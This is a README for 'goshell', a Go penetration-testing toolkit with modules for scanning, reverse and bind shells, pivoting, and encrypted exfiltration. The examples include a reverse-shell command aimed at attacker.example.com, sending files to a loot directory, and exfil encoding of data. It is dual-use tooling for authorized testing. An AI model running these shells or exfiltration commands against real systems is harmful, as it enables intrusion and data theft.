# goshell

> A Nishang-inspired offensive-security toolkit written in pure Go — a single static binary, zero third-party dependencies, engineered for longevity.

**⚠️ Authorized testing only.** goshell is dual-use software intended for penetration testers, red teamers, and security auditors working under a valid license or written authorization. Unauthorized use against systems you do not own or are not permitted to test is illegal. The authors accept no liability for misuse.

## Why goshell?

Most pentest toolkits rot: they pin old TLS versions, break on Y2038, depend on abandoned libraries, or bundle techniques that only make sense against a 2015-era Windows domain. goshell is built the opposite way — around **long-lived standards** and the Go standard library's stable surface, so the same source keeps building and behaving correctly for years.

**Longevity rules (enforced in code):**

1. **Zero third-party dependencies** — builds with any Go ≥ 1.22 toolchain; a single `main.go`, no external packages.
2. **TLS 1.2+ only** (TLS 1.0/1.1 obsoleted by RFC 8996), TLS 1.3 preferred.
3. **64-bit time everywhere** (Y2038-safe), RFC 3339 timestamps in all output.
4. **Context cancellation on every long-running module** — clean shutdown on `SIGINT`/`SIGTERM`.
5. **Dual-stack IPv4/IPv6 networking** (`netip` where possible).
6. **Retries with capped exponential backoff + `crypto/rand` full jitter** — not predictable timing.
7. **Interface-based module registry** — a new module is one `register()` call.
8. **Structured logging via `log/slog`**, deterministic help output.

**Not included by design:** keylogger, credential/Wi-Fi dumping, AV-evasion droppers, defender-defeating tricks. This is a recon and post-exploitation utility, not malware.

## Installation

```bash
git clone https://github.com/YOURUSER/goshell.git
cd goshell
go build -o goshell .
```

Or install directly:

```bash
go install github.com/YOURUSER/goshell@latest
```

Cross-compile everywhere Go supports — no cgo, no platform-specific build tags:

```bash
GOOS=windows GOARCH=amd64 go build -o goshell.exe .
GOOS=linux   GOARCH=arm64 go build -o goshell-arm .
```

Verify your build with the built-in self-test:

```bash
./goshell doctor
```

## Usage

```
goshell [-config file.json] <command> [flags]
```

Run `goshell` or `goshell help` for the full module list.

### gather

| Command | Description |
|---------|-------------|
| `sysinfo` | System & network information (hostname, user, elevation, interfaces) |
| `users` | List local users |
| `procs` | Running processes (reads `/proc` directly on Linux) |
| `services` | Installed/running services |
| `netstat` | Listening sockets & connections |
| `route` | Routing table |

### scan

| Command | Description |
|---------|-------------|
| `scan` | Concurrent TCP port scanner (`-h host -p 1-1024 [-json]`) |
| `sweep` | CIDR host discovery via common-port probes (`-c 10.0.0.0/24`) |
| `banner` | Grab service banners from open ports |

### dns

| Command | Description |
|---------|-------------|
| `dnslookup` | Resolve A / AAAA / MX / TXT / NS / CNAME / SRV |
| `revdns` | Reverse DNS (PTR) lookups |

### recon

| Command | Description |
|---------|-------------|
| `httphead` | HTTP fingerprint: status, server headers, title, TLS cert details |
| `download` | Fetch a file over HTTP(S) |

### shell

| Command | Description |
|---------|-------------|
| `rev` | Reverse TCP shell, TLS 1.2+ optional, retries with backoff |
| `bind` | Bind TCP shell |

### pivot

| Command | Description |
|---------|-------------|
| `udprelay` | Session-aware UDP relay (e.g. DNS tunneling) |
| `fwd` | Bidirectional TCP port forward (optional TLS upstream) |
| `socks5` | SOCKS5 CONNECT proxy (proxychains-ready, optional TLS listener) |
| `send` | Send a file to a goshell listener (TCP/TLS, acked) |
| `listen` | Receive files from `goshell send` |

### utility

| Command | Description |
|---------|-------------|
| `exfil` | Base64/hex codec with optional AES-256-GCM + XOR layers and chunking |
| `http` | HTTP file server |
| `hash` | MD5 + SHA-256 of files |
| `aes` | AES-256-GCM file encrypt/decrypt (PBKDF2-HMAC-SHA256, 600k iterations) |
| `zip` | Create/extract zip archives (zip-slip protected) |
| `doctor` | Self-test: crypto, networking, time, parsers |

### privesc

| Command | Description |
|---------|-------------|
| `privesc` | Privilege-escalation audit checks (SUID, AlwaysInstallElevated, caps, …) |
| `tasks` | Scheduled tasks / cron audit |
| `fw` | Firewall rules audit |

### filesystem

| Command | Description |
|---------|-------------|
| `hunt` | Find exposed sensitive/config files (paths only, no content scraping) |

## Examples

```bash
# Fingerprint a web server, including TLS certificate details
goshell httphead example.com

# Scan top ports with JSON output for reporting
goshell scan -h 10.0.0.5 -p 1-1024 -json > results.json

# Discover live hosts in a subnet
goshell sweep -c 192.168.1.0/24

# Reverse shell with retry + jittered backoff
goshell rev -a attacker.example.com:4444 -tls

# Encrypted file transfer
goshell listen -p 9001 -o loot/ -tls -many
goshell send -a target:9001 -f data.txt -tls

# Pivot through a foothold box
goshell socks5 -p 1080
proxychains nmap -sT 10.10.20.0/24

# Encode data for transport, encrypted, in report-friendly chunks
goshell exfil -f data.bin -aes 'passphrase' -chunk 60
goshell exfil -d -aes 'passphrase' < chunks.txt > data.bin

# Audit a box for privilege-escalation paths
goshell privesc && goshell tasks && goshell hunt -r /home
```

## Configuration

Optional JSON config file (path via `-config` or the `GOSHELL_CONFIG` env var). All values optional; sane defaults apply:

```json
{
  "retry_max": 5,
  "retry_base": "500ms",
  "dial_timeout": "5s",
  "scan_concurrency": 512,
  "keepalive": "30s"
}
```

Unknown fields are ignored for forward compatibility; durations are human-friendly strings.

## Security notes

- **AES envelope format v1 (`GSH1`):** `magic || 16-byte salt || 12-byte nonce || AES-256-GCM ciphertext+tag`, key derived via PBKDF2-HMAC-SHA256 (600k iterations, OWASP 2024 guidance). Files encrypted by goshell ≤ v0.4 use an older, incompatible format.
- **TLS listeners** use a per-run self-signed certificate — clients must deliberately pin or skip verification; TLS here protects the channel, not the identity.
- **Zip-slip protection** on both archive extraction and file reception (bare filenames only).
- **HTTP server** has slowloris guards (`ReadHeaderTimeout`, bounded header size).
- The XOR layer in `exfil` is lightweight obfuscation, **not** a substitute for AES.

## Extending

Add a module with one call:

```go
func cmdMine(ctx context.Context, cfg Config, args []string) error {
    // ...
}

func init() {
    register("mine", "utility", "does a thing", "goshell mine -x", cmdMine)
}
```

It automatically appears in `help` and command lookup — no other wiring.

## License

MIT (or replace with your license).

## Responsible disclosure

Found a bug in goshell itself? Open an issue or contact the maintainers privately. Please do not open issues describing unauthorized use.
